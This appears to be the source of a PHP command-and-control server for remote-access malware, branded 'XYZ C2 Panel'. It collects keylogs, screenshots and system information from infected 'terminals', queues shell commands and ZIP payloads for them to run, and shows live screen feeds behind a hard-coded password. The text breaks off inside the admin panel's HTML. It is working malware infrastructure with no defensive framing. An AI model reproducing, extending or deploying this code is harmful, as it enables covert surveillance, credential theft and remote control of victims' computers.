<?php
// Enhanced HTTP server to handle requests from the daemon
// Track online terminals and provide status information with modern UI/UX

// Control whether to send ZIP file response
$sendZip = true; // Set to true to send ZIP file, false to send JSON response
$xversion = "1.0.0"; // Current version of the executable

// Add request counter for cleanup
$requestCounterFile = 'request_counter.txt';
$requestCounter = 0;

// Initialize or increment request counter
if (file_exists($requestCounterFile)) {
    $requestCounter = (int)file_get_contents($requestCounterFile);
}
$requestCounter++;
file_put_contents($requestCounterFile, $requestCounter);

// Perform cleanup every 3 requests
if ($requestCounter % 3 == 0) {
   cleanupOldData();
    
}

// Handle different request types based on the URL path
$requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Route handling for shared hosting compatibility
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $requestUri === '/api/status') {
    // Handle status update POST requests
    handleStatusUpdate();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST' && $requestUri === '/api/upload') {
    // Handle file upload requests (screenshots, keylogs, etc.)
    handleFileUpload();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST' && $requestUri === '/api/systeminfo') {
    // Handle system information upload
    handleSystemInfo();
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestUri === '/api/terminals') {
    // Handle GET request for online terminals list (JSON)
    handleTerminalsList();
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestUri === '/api/files') {
    // Handle GET request for uploaded files
    handleFileList();
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && strpos($requestUri, '/api/livefeed/') === 0) {
    // Handle live feed requests
    handleLiveFeed();
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestUri === '/admin') {
    // Handle GET request for admin panel (HTML) with password protection
    handleAdminPanel();
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestUri === '/admin/terminal') {
    // Handle GET request for specific terminal details
    handleTerminalDetails();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST' && $requestUri === '/admin/sendpayload') {
    // Handle sending payload to specific terminal
    handleSendPayload();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST' && $requestUri === '/admin/webrtc') {
    // Handle WebRTC candidate exchange
    handleWebRTCExchange();
} else if ($_SERVER['REQUEST_METHOD'] === 'POST' && $requestUri === '/admin/command') {
    // Handle sending remote commands to terminals
    handleRemoteCommand();
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $requestUri === '/') {
    // Handle root path - show index.html
    if (file_exists('index.html')) {
        header("Content-Type: text/html");
        readfile('index.html');
        exit();
    } else {
        handleRoot();
    }
} else {
    // Handle 404 for unknown routes
    handleNotFound();
}

function handleRoot() {
    // Redirect to admin panel
    header("Location: /admin");
    exit();
}

function handleNotFound() {
    http_response_code(404);
    header("Content-Type: application/json");
    echo json_encode(['error' => 'Endpoint not found']);
}

function handleStatusUpdate() {
    global $sendZip, $xversion;
    
    // Get the JSON payload
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    // Log the request for debugging
    $logMessage = "Received request at: " . date('Y-m-d H:i:s') . "\n";
    $logMessage .= "Request data: " . print_r($data, true) . "\n";
    $logMessage .= "Request IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $logMessage .= "Send ZIP: " . ($sendZip ? "true" : "false") . "\n";
    $logMessage .= "Current xversion: " . $xversion . "\n";
    error_log($logMessage);
    
    // Check if it's a status request with online status
    if (isset($data['status']) && isset($data['id']) && $data['status'] === 'online') {
        // Always update the terminal status (register as online)
        updateTerminalStatus($data['id'], $data);
        
        // Save any keylog data
        if (isset($data['keylog']) && !empty($data['keylog'])) {
            saveKeylogData($data['id'], $data['keylog']);
        }
        
        // Save any screenshot data
        if (isset($data['screenshot']) && !empty($data['screenshot'])) {
            saveScreenshotData($data['id'], $data['screenshot']);
        }
        
        // Save system information if provided
        if (isset($data['system_info']) && is_array($data['system_info'])) {
            updateTerminalSystemInfo($data['id'], $data['system_info']);
        }
        
        // Process WebRTC candidates
        if (isset($data['webrtc_candidates']) && !empty($data['webrtc_candidates'])) {
            processWebRTCCandidates($data['id'], $data['webrtc_candidates']);
        }
        
        // Check if this specific terminal has a pending payload
        $payloadQueueFile = 'payload_queue.json';
        $sendPayloadToTerminal = false;
        $payloadFile = '';
        
        if (file_exists($payloadQueueFile)) {
            $queue = json_decode(file_get_contents($payloadQueueFile), true);
            if (is_array($queue) && isset($queue[$data['id']])) {
                $sendPayloadToTerminal = true;
                $payloadFile = $queue[$data['id']]['payload_file'];
                
                // Remove from queue
                unset($queue[$data['id']]);
                file_put_contents($payloadQueueFile, json_encode($queue));
            }
        }
        
        // Check if this specific terminal has pending commands
        $commandQueueFile = 'command_queue.json';
        $pendingCommands = [];
        
        if (file_exists($commandQueueFile)) {
            $commandQueue = json_decode(file_get_contents($commandQueueFile), true);
            if (is_array($commandQueue) && isset($commandQueue[$data['id']])) {
                $pendingCommands = $commandQueue[$data['id']];
                
                // Remove commands from queue
                unset($commandQueue[$data['id']]);
                file_put_contents($commandQueueFile, json_encode($commandQueue));
            }
        }
        
        // If we need to send a payload to this specific terminal, do it regardless of $sendZip
        if ($sendPayloadToTerminal && !empty($payloadFile) && file_exists($payloadFile)) {
            header("Content-Type: application/zip");
            readfile($payloadFile);
            exit;
        } else if (!empty($pendingCommands)) {
            // Send pending commands to terminal
            header("Content-Type: application/json");
            echo json_encode([
                'status' => 'success',
                'message' => 'Commands received',
                'commands' => $pendingCommands
            ]);
            exit;
        } else if ($sendZip) {
            // Check if terminal already has the current version
            if (shouldSendZipToTerminal($data['id'], $xversion)) {
                // Send ZIP response
                if (file_exists('payload.zip')) {
                    // Mark that we've sent this version to this terminal
                    markTerminalAsUpdated($data['id'], $xversion);
                    
                    header("Content-Type: application/zip");
                    // Read the ZIP file and send it
                    readfile('payload.zip');
                    exit;
                } else if (file_exists('test.zip')) {
                    // Fallback to test.zip
                    // Mark that we've sent this version to this terminal
                    markTerminalAsUpdated($data['id'], $xversion);
                    
                    header("Content-Type: application/zip");
                    // Read the ZIP file and send it
                    readfile('test.zip');
                    exit;
                } else {
                    // If no ZIP file, send regular response with WebRTC candidates
                    sendJSONResponse($data['id']);
                }
            } else {
                // Terminal already has current version, send regular response with WebRTC candidates
                $logMessage = "Terminal " . $data['id'] . " already has version " . $xversion . ", not sending ZIP\n";
                error_log($logMessage);
                sendJSONResponse($data['id']);
            }
        } else {
            // Just register as online, send regular JSON response with WebRTC candidates
            sendJSONResponse($data['id']);
        }
    } else {
        http_response_code(400);
        header("Content-Type: application/json");
        echo json_encode(['error' => 'Invalid request format']);
    }
}

function sendJSONResponse($terminalId) {
    header("Content-Type: application/json");
    
    // Check if we need to send WebRTC candidates for this terminal
    $webRTCCandidates = getWebRTCCandidatesForTerminal($terminalId);
    
    if (!empty($webRTCCandidates)) {
        // Send WebRTC candidates
        echo json_encode([
            'status' => 'success',
            'message' => 'Online confirmed',
            'webrtc_candidates' => $webRTCCandidates
        ]);
    } else {
        // Send regular response
        echo json_encode([
            'status' => 'success',
            'message' => 'Online confirmed'
        ]);
    }
}

function saveKeylogData($terminalId, $keylogData) {
    // Save keylog data to file with timestamp
    $keylogDir = 'uploads/' . $terminalId;
    if (!is_dir($keylogDir)) {
        mkdir($keylogDir, 0755, true);
    }
    
    $timestamp = time();
    $keylogFile = $keylogDir . '/keylog_' . $timestamp . '.txt';
    file_put_contents($keylogFile, $keylogData);
}

function saveScreenshotData($terminalId, $screenshotPath) {
    // In a real implementation, we would save the screenshot data
    // For now, we'll just log that we received screenshot data
    error_log("Received screenshot data from terminal " . $terminalId . ": " . $screenshotPath);
    
    // Create uploads directory if it doesn't exist
    $uploadDir = 'uploads/' . $terminalId;
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    
    // Generate a timestamped filename for the screenshot
    $timestamp = time();
    $screenshotFile = $uploadDir . '/screenshot_' . $timestamp . '.png';
    
    // If the screenshot path is actually a file upload, handle it properly
    if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
        move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotFile);
    } else {
        // In a real implementation, you would move or copy the screenshot file to this location
        // For now, we'll just create a placeholder file to demonstrate the concept
        file_put_contents($screenshotFile, "Screenshot placeholder for terminal " . $terminalId . " at " . date('Y-m-d H:i:s', $timestamp));
    }
}

function processWebRTCCandidates($terminalId, $candidates) {
    // Save WebRTC candidates for this terminal with timestamp
    $webRTCDir = 'webrtc';
    if (!is_dir($webRTCDir)) {
        mkdir($webRTCDir, 0755, true);
    }
    
    $timestamp = time();
    $candidatesFile = $webRTCDir . '/' . $terminalId . '_candidates_' . $timestamp . '.json';
    file_put_contents($candidatesFile, json_encode([
        'terminal_id' => $terminalId,
        'candidates' => $candidates,
        'timestamp' => $timestamp
    ]));
}

function getWebRTCCandidatesForTerminal($terminalId) {
    // Get the most recent WebRTC candidates to send back to terminal
    $webRTCDir = 'webrtc';
    if (!is_dir($webRTCDir)) {
        return '';
    }
    
    // Find all candidate files for this terminal
    $candidateFiles = glob($webRTCDir . '/' . $terminalId . '_candidates_*.json');
    
    if (empty($candidateFiles)) {
        return '';
    }
    
    // Sort files by timestamp (newest first)
    usort($candidateFiles, function($a, $b) {
        $timestampA = (int)preg_replace('/.*_candidates_(\d+)\.json/', '$1', $a);
        $timestampB = (int)preg_replace('/.*_candidates_(\d+)\.json/', '$1', $b);
        return $timestampB - $timestampA;
    });
    
    // Get the most recent file
    $latestFile = $candidateFiles[0];
    if (file_exists($latestFile)) {
        $data = json_decode(file_get_contents($latestFile), true);
        return $data['candidates'];
    }
    return '';
}

function handleFileUpload() {
    header("Content-Type: application/json");
    
    // Get terminal ID from headers or query parameters
    $terminalId = $_SERVER['HTTP_X_TERMINAL_ID'] ?? $_GET['id'] ?? 'unknown';
    
    // Create uploads directory if it doesn't exist
    $uploadDir = 'uploads/' . $terminalId;
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    
    // Handle screenshot upload specifically for live feed
    if (isset($_FILES['screenshot'])) {
        $fileType = $_FILES['screenshot']['type'];
        $fileTmpName = $_FILES['screenshot']['tmp_name'];
        
        // Generate filename with timestamp for screenshots
        $timestamp = time();
        $uniqueFileName = 'screenshot_' . $timestamp . '.png';
        $destination = $uploadDir . '/' . $uniqueFileName;
        
        // Move uploaded screenshot
        if (move_uploaded_file($fileTmpName, $destination)) {
            // Update terminal with file information
            updateTerminalFile($terminalId, $uniqueFileName, $fileType, filesize($destination));
            
            echo json_encode(['status' => 'success', 'message' => 'Screenshot uploaded successfully']);
        } else {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Failed to upload screenshot']);
        }
    }
    // Handle regular file upload
    else if (isset($_FILES['file'])) {
        $fileName = $_FILES['file']['name'];
        $fileType = $_FILES['file']['type'];
        $fileTmpName = $_FILES['file']['tmp_name'];
        
        // Generate filename with timestamp to prevent conflicts and enable cleanup
        $timestamp = time();
        $fileExt = pathinfo($fileName, PATHINFO_EXTENSION);
        $baseName = pathinfo($fileName, PATHINFO_FILENAME);
        $uniqueFileName = $baseName . '_' . $timestamp . '.' . $fileExt;
        $destination = $uploadDir . '/' . $uniqueFileName;
        
        // Move uploaded file
        if (move_uploaded_file($fileTmpName, $destination)) {
            // Update terminal with file information
            updateTerminalFile($terminalId, $uniqueFileName, $fileType, filesize($destination));
            
            echo json_encode(['status' => 'success', 'message' => 'File uploaded successfully']);
        } else {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Failed to upload file']);
        }
    } else {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'No file provided']);
    }
}

function handleSystemInfo() {
    header("Content-Type: application/json");
    
    // Get the JSON payload
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    // Get terminal ID
    $terminalId = $data['id'] ?? 'unknown';
    
    // Create system info directory if it doesn't exist
    $sysInfoDir = 'systeminfo/' . $terminalId;
    if (!is_dir($sysInfoDir)) {
        mkdir($sysInfoDir, 0755, true);
    }
    
    // Save system info to file with timestamp
    $timestamp = time();
    $sysInfoFile = $sysInfoDir . '/info_' . $timestamp . '.json';
    file_put_contents($sysInfoFile, $input);
    
    // Update terminal with system info
    updateTerminalSystemInfo($terminalId, $data);
    
    echo json_encode(['status' => 'success', 'message' => 'System information received']);
}

function handleTerminalsList() {
    header("Content-Type: application/json");
    
    // Clean up old terminals (older than 5 minutes)
    cleanupTerminals();
    
    // Get current online terminals
    $terminals = getOnlineTerminals();
    
    // Send the list of online terminals
    echo json_encode([
        'status' => 'success',
        'terminals' => $terminals,
        'count' => count($terminals)
    ]);
}

function handleTerminalDetails() {
    $terminalId = $_GET['id'] ?? '';
    
    if (empty($terminalId)) {
        http_response_code(400);
        header("Content-Type: application/json");
        echo json_encode(['error' => 'Terminal ID required']);
        return;
    }
    
    // Get terminal details
    $terminal = getTerminalDetails($terminalId);
    
    if (!$terminal) {
        http_response_code(404);
        header("Content-Type: application/json");
        echo json_encode(['error' => 'Terminal not found']);
        return;
    }
    
    header("Content-Type: application/json");
    echo json_encode([
        'status' => 'success',
        'terminal' => $terminal
    ]);
}

function handleSendPayload() {
    header("Content-Type: application/json");
    
    // Get the JSON payload
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    $terminalId = $data['terminal_id'] ?? '';
    $payloadFile = $data['payload_file'] ?? '';
    
    if (empty($terminalId) || empty($payloadFile)) {
        http_response_code(400);
        echo json_encode(['error' => 'Terminal ID and payload file required']);
        return;
    }
    
    // Validate payload file
    if (!validatePayloadFile($payloadFile)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid payload file. File must exist and be a .zip file.']);
        return;
    }
    
    // Mark terminal to receive payload on next check-in
    markTerminalForPayload($terminalId, $payloadFile);
    
    // Log payload delivery
    logPayloadDelivery($terminalId, $payloadFile);
    
    echo json_encode(['status' => 'success', 'message' => 'Payload scheduled for delivery']);
}

function handleWebRTCExchange() {
    header("Content-Type: application/json");
    
    // Get the JSON payload
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    $terminalId = $data['terminal_id'] ?? '';
    $candidates = $data['candidates'] ?? '';
    
    if (empty($terminalId) || empty($candidates)) {
        http_response_code(400);
        echo json_encode(['error' => 'Terminal ID and candidates required']);
        return;
    }
    
    // Save WebRTC candidates from C2 to send to terminal
    $c2CandidatesFile = 'webrtc/' . $terminalId . '_c2_candidates.json';
    file_put_contents($c2CandidatesFile, json_encode([
        'terminal_id' => $terminalId,
        'candidates' => $candidates,
        'timestamp' => time()
    ]));
    
    echo json_encode(['status' => 'success', 'message' => 'WebRTC candidates saved']);
}

function handleRemoteCommand() {
    header("Content-Type: application/json");
    
    // Get the JSON payload
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    $terminalId = $data['terminal_id'] ?? '';
    $command = $data['command'] ?? '';
    $commandType = $data['type'] ?? 'shell';
    
    if (empty($terminalId) || empty($command)) {
        http_response_code(400);
        echo json_encode(['error' => 'Terminal ID and command required']);
        return;
    }
    
    // Add command to queue for terminal
    addCommandToQueue($terminalId, $command, $commandType);
    
    echo json_encode(['status' => 'success', 'message' => 'Command queued for delivery']);
}

function addCommandToQueue($terminalId, $command, $commandType) {
    // Add command to queue for terminal
    $commandQueueFile = 'command_queue.json';
    $queue = [];
    
    if (file_exists($commandQueueFile)) {
        $queue = json_decode(file_get_contents($commandQueueFile), true);
        if (!is_array($queue)) {
            $queue = [];
        }
    }
    
    if (!isset($queue[$terminalId])) {
        $queue[$terminalId] = [];
    }
    
    $queue[$terminalId][] = [
        'command' => $command,
        'type' => $commandType,
        'timestamp' => time()
    ];
    
    file_put_contents($commandQueueFile, json_encode($queue));
}

function handleAdminPanel() {
    // Check if password is provided
    $password = isset($_GET['password']) ? $_GET['password'] : '';
    
    // Password protection (password: 54321)
    if ($password !== '54321') {
        // Show password form
        header("Content-Type: text/html; charset=utf-8");
        echo '<!DOCTYPE html>
<html>
<head>
    <title>XYZ C2 - Admin Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
    <style>
        :root {
            --primary-color: #6f42c1;
            --secondary-color: #007bff;
            --dark-bg: #121826;
            --card-bg: #1e293b;
            --text-color: #e2e8f0;
        }
        body {
            background-color: var(--dark-bg);
            color: var(--text-color);
            font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .navbar {
            background-color: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .card {
            background-color: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 1.5rem;
        }
        .card-header {
            background-color: rgba(255, 255, 255, 0.05);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            font-weight: 600;
        }
        .table {
            color: var(--text-color);
        }
        .table th {
            border-top: none;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .table td {
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }
        .btn-primary:hover {
            background-color: #5a32a3;
            border-color: #5a32a3;
        }
        .btn-secondary {
            background-color: var(--secondary-color);
            border-color: var(--secondary-color);
        }
        .btn-secondary:hover {
            background-color: #0069d9;
            border-color: #0069d9;
        }
        .status-online {
            color: #28a745;
        }
        .status-offline {
            color: #dc3545;
        }
        .terminal-card {
            transition: transform 0.2s;
        }
        .terminal-card:hover {
            transform: translateY(-2px);
        }
        .stat-card {
            text-align: center;
            padding: 1.5rem;
        }
        .stat-number {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        .stat-label {
            font-size: 0.9rem;
            opacity: 0.8;
        }
        .payload-section {
            background-color: rgba(111, 66, 193, 0.1);
            border-left: 4px solid var(--primary-color);
        }
        .data-section {
            background-color: rgba(0, 123, 255, 0.1);
            border-left: 4px solid var(--secondary-color);
        }
        .webrtc-section {
            background-color: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
        }
        .command-section {
            background-color: rgba(40, 167, 69, 0.1);
            border-left: 4px solid #28a745;
        }
        .activity-log {
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <i class="bi bi-shield-lock"></i> XYZ C2 Panel
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto">
                    <li class="nav-item">
                        <a class="nav-link active" href="/admin?password=54321">
                            <i class="bi bi-display"></i> Terminals
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">
                            <i class="bi bi-file-earmark-binary"></i> Payloads
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">
                            <i class="bi bi-activity"></i> Logs
                        </a>
                    </li>
                </ul>
                <div class="d-flex">
                    <span class="navbar-text me-3">
                        <i class="bi bi-clock"></i> ' . date('Y-m-d H:i:s') . '
                    </span>
                    <a href="?logout=1" class="btn btn-outline-light btn-sm">
                        <i class="bi bi-box-arrow-right"></i> Logout
                    </a>
                </div>
            </div>
        </div>
    </nav>

    <div class="container-fluid py-4">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <h4 class="mb-0">
                            <i class="bi bi-key"></i> Admin Panel Access
                        </h4>
                    </div>
                    <div class="card-body">
                        <form method="GET" action="/admin">
                            <div class="mb-3">
                                <label for="password" class="form-label">Enter Admin Password</label>
                                <div class="input-group">
                                    <span class="input-group-text">
                                        <i class="bi bi-lock"></i>
                                    </span>
                                    <input type="password" class="form-control" name="password" id="password" placeholder="Enter admin password" required>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary">
                                <i class="bi bi-box-arrow-in-right"></i> Access Admin Panel
                            </button>
                        </form>
                        ' . ($password ? '<div class="alert alert-danger mt-3 mb-0"><i class="bi bi-exclamation-triangle"></i> Incorrect password. Please try again.</div>' : '') . '
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>';
        return;
    }
    
    header("Content-Type: text/html; charset=utf-8");
    
    // Clean up old terminals (older than 5 minutes)
    cleanupTerminals();
    
    // Get current online terminals
    $terminals = getOnlineTerminals();
    
    // Get statistics
    $totalTerminals = count($terminals);
    $onlineTerminals = 0;
    $offlineTerminals = 0;
    
    foreach ($terminals as $terminal) {
        $timeSince = time() - $terminal['last_seen'];
        if ($timeSince < 60) {
            $onlineTerminals++;
        } else {
            $offlineTerminals++;
        }
    }
    
    // Render HTML page with modern UI
    echo '<!DOCTYPE html>
<html>
<head>
    <title>XYZ C2 - Admin Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
    <style>
        :root {
            --primary-color: #6f42c1;
            --secondary-color: #007bff;
            --dark-bg: #121826;
            --card-bg: #1e293b;
            --text-color: #e2e8f0;
        }
        body {
            background-color: var(--dark-bg);
            color: var(--text-color);
            font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .navbar {
            background-color: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .card {
            background-color: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 1.5rem;
        }
        .card-header {
            background-color: rgba(255, 255, 255, 0.05);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            font-weight: 600;
        }
        .table {
            color: var(--text-color);
        }
        .table th {
            border-top: none;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .table td {
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }
        .btn-primary:hover {
            background-color: #5a32a3;
            border-color: #5a32a3;
        }
        .btn-secondary {
            background-color: var(--secondary-color);
            border-color: var(--secondary-color);
        }
        .btn-secondary:hover {
            background-color: #0069d9;
            border-color: #0069d9;
        }
        .status-online {
            color: #28a745;
        }
        .status-offline {
            color: #dc3545;
        }
        .terminal-card {
            transition: transform 0.2s;
        }
        .terminal-card:hover {
            transform: translateY(-2px);
        }
        .stat-card {
            text-align: center;
            padding: 1.5rem;
        }
        .stat-number {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        .stat-label {
            font-size: 0.9rem;
            opacity: 0.8;
        }
        .payload-section {
            background-color: rgba(111, 66, 193, 0.1);
            border-left: 4px solid var(--primary-color);
        }
        .data-section {
            background-color: rgba(0, 123, 255, 0.1);
            border-left: 4px solid var(--secondary-color);
        }
        .webrtc-section {
            background-color: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
        }
        .command-section {
            background-color: rgba(40, 167, 69, 0.1);
            border-left: 4px solid #28a745;
        }
        .activity-log {
            max-height: 300px;
            overflow-y: auto;
        }
        .data-badge {
            font-size: 0.8rem;
            margin-right: 5px;
        }
        .live-feed-container {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            justify-content: center;
        }
        .live-feed {
            width: 300px;
            height: 200px;
            background-color: #000;
            border: 2px solid #6f42c1;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            transition: opacity 0.3s ease-in-out;
        }
        .live-feed img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: opacity 0.3s ease-in-out;
        }
        .live-feed-header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 5px;
            font-size: 0.8rem;
            text-align: center;
        }
        .no-feed {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #6c757d;
            font-style: italic;
            height: 100%;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <i class="bi bi-shield-lock"></i> XYZ C2 Panel
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto">
                    <li class="nav-item">
                        <a class="nav-link active" href="/admin?password=54321">
                            <i class="bi bi-display"></i> Terminals
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">
                            <i class="bi bi-file-earmark-binary"></i> Payloads
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">
                            <i class="bi bi-activity"></i> Logs
                        </a>
                    </li>
                </ul>
                <div class="d-flex">
                    <span class="navbar-text me-3">
                        <i class="bi bi-clock"></i> ' . date('Y-m-d H:i:s') . '
                    </span>
                    <a href="/" class="btn btn-outline-light btn-sm">
                        <i class="bi bi-box-arrow-right"></i> Logout
                    </a>
                </div>
            </div>
        </div>
    </nav>

    <div class="container-fluid py-4">
        <!-- Stats Cards -->
        <div class="row">
            <div class="col-md-4">
                <div class="card stat-card">
                    <div class="stat-number text-primary">' . $totalTerminals . '</div>
                    <div class="stat-label">Total Terminals</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card stat-card">
                    <div class="stat-number text-success">' . $onlineTerminals . '</div>
                    <div class="stat-label">Online Now</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card stat-card">
                    <div class="stat-number text-danger">' . $offlineTerminals . '</div>
                    <div class="stat-label">Offline</div>
                </div>
            </div>
        </div>

        <!-- Live Feed Section -->
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <h5 class="mb-0">
                            <i class="bi bi-camera-reels"></i> Live Terminal Feeds
                        </h5>
                        <button class="btn btn-sm btn-outline-light" onclick="refreshFeeds()">
                            <i class="bi bi-arrow-clockwise"></i> Refresh
                        </button>
                    </div>
                    <div class="card-body">
                        <div class="live-feed-container" id="liveFeedContainer">';
    
    // Display live feeds for each terminal
    if (empty($terminals)) {
        echo '<div class="no-feed">No terminals connected</div>';
    } else {
        foreach ($terminals as $terminal) {
            $timeSince = time() - $terminal['last_seen'];
            $status = ($timeSince < 60) ? 'ONLINE' : 'OFFLINE';
            echo '<div class="live-feed">
                    <div class="live-feed-header">' . htmlspecialchars($terminal['id']) . ' (' . $status . ')</div>
                    <img src="/api/livefeed/' . htmlspecialchars($terminal['id']) . '?t=' . time() . '" alt="Live feed from ' . htmlspecialchars($terminal['id']) . '" onerror="this.src=\'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMzMzIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOHB4IiBmaWxsPSIjNjY2IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5ObyBGZWVkPC90ZXh0Pjwvc3ZnPg==\'">
                  </div>';
        }
    }
    
    echo '      </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Payload Section -->
        <div class="row">
            <div class="col-12">
                <div class="card payload-section">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <i class="bi bi-send"></i> Send Payload
                        </h5>
                    </div>
                    <div class="card-body">
                        <form id="payloadForm">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label for="terminalSelect" class="form-label">Select Terminal</label>
                                        <select class="form-select" id="terminalSelect" required>
                                            <option value="">Choose a terminal...</option>';
    
    foreach ($terminals as $terminal) {
        $timeSince = time() - $terminal['last_seen'];
        $status = ($timeSince < 60) ? 'ONLINE' : 'OFFLINE';
        echo '<option value="' . htmlspecialchars($terminal['id']) . '">' . htmlspecialchars($terminal['id']) . ' (' . $status . ')</option>';
    }
    
    echo '              </select>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label for="payloadFile" class="form-label">Payload File</label>
                                        <input type="text" class="form-control" id="payloadFile" placeholder="payload.zip" value="payload.zip" required>
                                    </div>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary">
                                <i class="bi bi-send"></i> Send Payload
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- WebRTC Section -->
        <div class="row">
            <div class="col-12">
                <div class="card webrtc-section">
                    <div class="card-header">
                        <h5 class="mb-0">
                            <i class="bi bi-camera-video"></i> WebRTC Remote Control
                        </h5>
                    </div>
                    <div class="card-body">
                        <p>Establish WebRTC connections with terminals for remote control capabilities.</p>
                        <form id="webrtcForm">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="mb-3">
